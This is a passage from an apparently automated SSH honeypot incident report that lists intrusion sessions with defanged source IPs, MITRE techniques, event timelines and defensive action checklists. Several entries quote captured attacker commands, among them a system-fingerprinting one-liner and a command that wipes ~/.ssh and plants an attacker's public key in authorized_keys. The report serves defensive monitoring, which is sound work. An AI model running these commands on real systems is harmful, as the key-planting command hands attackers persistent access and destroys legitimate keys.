| `2026-07-08 03:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8053752b00dd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:51 |
| **Last Seen** | 2026-07-08 03:52 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:51:50` | `cowrie.session.connect` |
| `2026-07-08 03:51:52` | `cowrie.client.version` |
| `2026-07-08 03:51:52` | `cowrie.client.kex` |
| `2026-07-08 03:51:58` | `cowrie.login.success` |
| `2026-07-08 03:52:01` | `cowrie.session.params` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.success` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:01` | `cowrie.command.input` |
| `2026-07-08 03:52:03` | `cowrie.log.closed` |
| `2026-07-08 03:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0504d3e9aa56

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-07-08 03:52 |
| **Last Seen** | 2026-07-08 03:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:52:23` | `cowrie.session.connect` |
| `2026-07-08 03:52:24` | `cowrie.client.version` |
| `2026-07-08 03:52:24` | `cowrie.client.kex` |
| `2026-07-08 03:52:26` | `cowrie.login.success` |
| `2026-07-08 03:52:27` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48397939abdd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:53 |
| **Last Seen** | 2026-07-08 03:53 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:53:22` | `cowrie.session.connect` |
| `2026-07-08 03:53:24` | `cowrie.client.version` |
| `2026-07-08 03:53:24` | `cowrie.client.kex` |
| `2026-07-08 03:53:31` | `cowrie.login.success` |
| `2026-07-08 03:53:36` | `cowrie.session.params` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.success` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:36` | `cowrie.command.input` |
| `2026-07-08 03:53:38` | `cowrie.log.closed` |
| `2026-07-08 03:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0a34540aac

| Field | Detail |
|---|---|
| **Source IP** | `220.161.52[.]149` |
| **First Seen** | 2026-07-08 03:54 |
| **Last Seen** | 2026-07-08 03:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:54:00` | `cowrie.session.connect` |
| `2026-07-08 03:54:01` | `cowrie.client.version` |
| `2026-07-08 03:54:01` | `cowrie.client.kex` |
| `2026-07-08 03:54:04` | `cowrie.login.success` |
| `2026-07-08 03:54:05` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.161.52[.]149` to AbuseIPDB if not already reported
- [ ] Block `220.161.52[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3457313bfc5

| Field | Detail |
|---|---|
| **Source IP** | `41.65.118[.]172` |
| **First Seen** | 2026-07-08 03:54 |
| **Last Seen** | 2026-07-08 03:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:54:11` | `cowrie.session.connect` |
| `2026-07-08 03:54:12` | `cowrie.client.version` |
| `2026-07-08 03:54:12` | `cowrie.client.kex` |
| `2026-07-08 03:54:14` | `cowrie.login.success` |
| `2026-07-08 03:54:15` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.65.118[.]172` to AbuseIPDB if not already reported
- [ ] Block `41.65.118[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a526256630c3

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-07-08 03:54 |
| **Last Seen** | 2026-07-08 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:54:37` | `cowrie.session.connect` |
| `2026-07-08 03:54:37` | `cowrie.client.version` |
| `2026-07-08 03:54:37` | `cowrie.client.kex` |
| `2026-07-08 03:54:37` | `cowrie.login.success` |
| `2026-07-08 03:54:37` | `cowrie.session.params` |
| `2026-07-08 03:54:37` | `cowrie.command.input` |
| `2026-07-08 03:54:37` | `cowrie.command.failed` |
| `2026-07-08 03:54:37` | `cowrie.log.closed` |
| `2026-07-08 03:54:38` | `cowrie.session.params` |
| `2026-07-08 03:54:38` | `cowrie.command.input` |
| `2026-07-08 03:54:38` | `cowrie.session.file_download` |
| `2026-07-08 03:54:38` | `cowrie.log.closed` |
| `2026-07-08 03:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1b675f18633

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-07-08 03:54 |
| **Last Seen** | 2026-07-08 03:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:54:38` | `cowrie.session.connect` |
| `2026-07-08 03:54:38` | `cowrie.client.version` |
| `2026-07-08 03:54:38` | `cowrie.client.kex` |
| `2026-07-08 03:54:38` | `cowrie.login.success` |
| `2026-07-08 03:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88d6bdbf533

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-07-08 03:54 |
| **Last Seen** | 2026-07-08 03:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:54:38` | `cowrie.session.connect` |
| `2026-07-08 03:54:38` | `cowrie.client.version` |
| `2026-07-08 03:54:38` | `cowrie.client.kex` |
| `2026-07-08 03:54:38` | `cowrie.login.success` |
| `2026-07-08 03:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5390f90a73e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:54 |
| **Last Seen** | 2026-07-08 03:55 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:54:54` | `cowrie.session.connect` |
| `2026-07-08 03:54:56` | `cowrie.client.version` |
| `2026-07-08 03:54:56` | `cowrie.client.kex` |
| `2026-07-08 03:55:03` | `cowrie.login.success` |
| `2026-07-08 03:55:07` | `cowrie.session.params` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.success` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:07` | `cowrie.command.input` |
| `2026-07-08 03:55:09` | `cowrie.log.closed` |
| `2026-07-08 03:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c530c2544b6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:56 |
| **Last Seen** | 2026-07-08 03:56 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:56:24` | `cowrie.session.connect` |
| `2026-07-08 03:56:25` | `cowrie.client.version` |
| `2026-07-08 03:56:25` | `cowrie.client.kex` |
| `2026-07-08 03:56:32` | `cowrie.login.success` |
| `2026-07-08 03:56:35` | `cowrie.session.params` |
| `2026-07-08 03:56:35` | `cowrie.command.input` |
| `2026-07-08 03:56:35` | `cowrie.command.input` |
| `2026-07-08 03:56:35` | `cowrie.command.input` |
| `2026-07-08 03:56:35` | `cowrie.command.input` |
| `2026-07-08 03:56:35` | `cowrie.command.input` |
| `2026-07-08 03:56:35` | `cowrie.command.success` |
| `2026-07-08 03:56:35` | `cowrie.command.input` |
| `2026-07-08 03:56:36` | `cowrie.command.input` |
| `2026-07-08 03:56:36` | `cowrie.command.input` |
| `2026-07-08 03:56:36` | `cowrie.command.input` |
| `2026-07-08 03:56:37` | `cowrie.log.closed` |
| `2026-07-08 03:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d415c41a1e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:57 |
| **Last Seen** | 2026-07-08 03:58 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:57:50` | `cowrie.session.connect` |
| `2026-07-08 03:57:52` | `cowrie.client.version` |
| `2026-07-08 03:57:52` | `cowrie.client.kex` |
| `2026-07-08 03:57:58` | `cowrie.login.success` |
| `2026-07-08 03:58:01` | `cowrie.session.params` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.success` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:01` | `cowrie.command.input` |
| `2026-07-08 03:58:03` | `cowrie.log.closed` |
| `2026-07-08 03:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de67dfd8a49

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:59 |
| **Last Seen** | 2026-07-08 03:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:59:17` | `cowrie.session.connect` |
| `2026-07-08 03:59:18` | `cowrie.client.version` |
| `2026-07-08 03:59:18` | `cowrie.client.kex` |
| `2026-07-08 03:59:23` | `cowrie.login.success` |
| `2026-07-08 03:59:27` | `cowrie.session.params` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.success` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:27` | `cowrie.command.input` |
| `2026-07-08 03:59:29` | `cowrie.log.closed` |
| `2026-07-08 03:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24298d10f0f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:00 |
| **Last Seen** | 2026-07-08 04:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:00:42` | `cowrie.session.connect` |
| `2026-07-08 04:00:44` | `cowrie.client.version` |
| `2026-07-08 04:00:44` | `cowrie.client.kex` |
| `2026-07-08 04:00:49` | `cowrie.login.success` |
| `2026-07-08 04:00:52` | `cowrie.session.params` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.success` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:52` | `cowrie.command.input` |
| `2026-07-08 04:00:54` | `cowrie.log.closed` |
| `2026-07-08 04:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5926af8574f0

| Field | Detail |
|---|---|
| **Source IP** | `95.98.59[.]198` |
| **First Seen** | 2026-07-08 04:01 |
| **Last Seen** | 2026-07-08 04:02 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:01:51` | `cowrie.session.connect` |
| `2026-07-08 04:01:51` | `cowrie.client.version` |
| `2026-07-08 04:01:51` | `cowrie.client.kex` |
| `2026-07-08 04:01:51` | `cowrie.login.success` |
| `2026-07-08 04:02:28` | `cowrie.session.file_upload` |
| `2026-07-08 04:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.98.59[.]198` to AbuseIPDB if not already reported
- [ ] Block `95.98.59[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b471c5e403

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:02 |
| **Last Seen** | 2026-07-08 04:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:02:12` | `cowrie.session.connect` |
| `2026-07-08 04:02:12` | `cowrie.client.version` |
| `2026-07-08 04:02:12` | `cowrie.client.kex` |
| `2026-07-08 04:02:18` | `cowrie.login.success` |
| `2026-07-08 04:02:20` | `cowrie.session.params` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.success` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:20` | `cowrie.command.input` |
| `2026-07-08 04:02:22` | `cowrie.log.closed` |
| `2026-07-08 04:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02342eab7c3

| Field | Detail |
|---|---|
| **Source IP** | `34.76.232[.]48` |
| **First Seen** | 2026-07-08 04:02 |
| **Last Seen** | 2026-07-08 04:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:02:43` | `cowrie.session.connect` |
| `2026-07-08 04:02:44` | `cowrie.login.success` |
| `2026-07-08 04:02:44` | `cowrie.session.params` |
| `2026-07-08 04:02:44` | `cowrie.command.input` |
| `2026-07-08 04:02:44` | `cowrie.command.input` |
